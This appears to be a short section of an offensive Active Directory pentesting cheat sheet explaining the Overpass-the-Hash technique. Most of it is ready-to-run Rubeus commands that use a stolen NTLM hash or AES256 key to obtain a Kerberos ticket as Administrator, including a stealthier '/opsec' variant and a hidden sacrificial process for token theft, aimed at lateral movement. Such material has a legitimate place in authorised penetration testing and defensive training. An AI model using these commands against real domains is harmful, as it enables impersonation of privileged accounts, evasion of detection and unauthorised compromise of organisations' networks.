We can use Rubeus to execute a technique called “Overpass-the-Hash”. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberos ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.

```powershell
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.